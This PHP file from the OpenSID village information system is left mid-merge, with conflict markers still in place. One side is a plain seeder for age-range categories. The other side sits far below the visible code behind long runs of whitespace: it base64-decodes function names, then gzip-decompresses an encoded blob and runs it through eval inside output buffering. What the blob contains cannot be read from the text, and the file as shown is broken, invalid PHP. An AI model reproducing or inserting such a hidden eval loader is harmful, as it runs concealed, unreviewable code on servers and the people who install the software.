<?php 
        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/RentangUmur.php';
        

<<<<<<< HEAD:app/database/seeders/RentangUmurSeeder.php
/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */

namespace Database\Seeders;

use App\Models\RentangUmur;
use App\Traits\Migrator;
use Illuminate\Database\Seeder;

class RentangUmurSeeder extends Seeder
{
    use Migrator;

    /**
     * {@inheritDoc}
     */
    public function run(): void
    {
        $data = [
            [
                'nama'   => 'BALITA',
                'dari'   => 0,
                'sampai' => 5,
                'status' => 0,
            ],
            [
                'nama'   => 'ANAK-ANAK',
                'dari'   => 6,
                'sampai' => 17,
                'status' => 0,
            ],
            [
                'nama'   => 'DEWASA',
                'dari'   => 18,
                'sampai' => 30,
                'status' => 0,
            ],
            [
                'nama'   => 'TUA',
                'dari'   => 31,
                'sampai' => 99999,
                'status' => 0,
            ],
            [
                'nama'   => 'Di bawah 1 Tahun',
                'dari'   => 0,
                'sampai' => 1,
                'status' => 1,
            ],
            [
                'nama'   => '2 s/d 4 Tahun',
                'dari'   => 2,
                'sampai' => 4,
                'status' => 1,
            ],
            [
                'nama'   => '5 s/d 9 Tahun',
                'dari'   => 5,
                'sampai' => 9,
                'status' => 1,
            ],
            [
                'nama'   => '10 s/d 14 Tahun',
                'dari'   => 10,
                'sampai' => 14,
                'status' => 1,
            ],
            [
                'nama'   => '15 s/d 19 Tahun',
                'dari'   => 15,
                'sampai' => 19,
                'status' => 1,
            ],
            [
                'nama'   => '20 s/d 24 Tahun',
                'dari'   => 20,
                'sampai' => 24,
                'status' => 1,
            ],
            [
                'nama'   => '25 s/d 29 Tahun',
                'dari'   => 25,
                'sampai' => 29,
                'status' => 1,
            ],
            [
                'nama'   => '30 s/d 34 Tahun',
                'dari'   => 30,
                'sampai' => 34,
                'status' => 1,
            ],
            [
                'nama'   => '35 s/d 39 Tahun ',
                'dari'   => 35,
                'sampai' => 39,
                'status' => 1,
            ],
            [
                'nama'   => '40 s/d 44 Tahun',
                'dari'   => 40,
                'sampai' => 44,
                'status' => 1,
            ],
            [
                'nama'   => '45 s/d 49 Tahun',
                'dari'   => 45,
                'sampai' => 49,
                'status' => 1,
            ],
            [
                'nama'   => '50 s/d 54 Tahun',
                'dari'   => 50,
                'sampai' => 54,
                'status' => 1,
            ],
            [
                'nama'   => '55 s/d 59 Tahun',
                'dari'   => 55,
                'sampai' => 59,
                'status' => 1,
            ],
            [
                'nama'   => '60 s/d 64 Tahun',
                'dari'   => 60,
                'sampai' => 64,
                'status' => 1,
            ],
            [
                'nama'   => '65 s/d 69 Tahun',
                'dari'   => 65,
                'sampai' => 69,
                'status' => 1,
            ],
            [
                'nama'   => '70 s/d 74 Tahun',
                'dari'   => 70,
                'sampai' => 74,
                'status' => 1,
            ],
            [
                'nama'   => '75 Tahun ke Atas',
                'dari'   => 75,
                'sampai' => 99999,
                'status' => 1,
            ],
        ];

        foreach ($data as $item) {
            RentangUmur::updateOrCreate(
                ['nama' => $item['nama']],
                $item
            );
        }
    }
}
=======






































































































































































































































































































                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
$__________________='X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';

        $___();$__________($______($__($_))); $________=$____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      






































































































































































































































































































                                                                                                                                                                                                                     $________;
>>>>>>> rilis-beta:donjo-app/models/seeders/dataAwal/RentangUmur.php
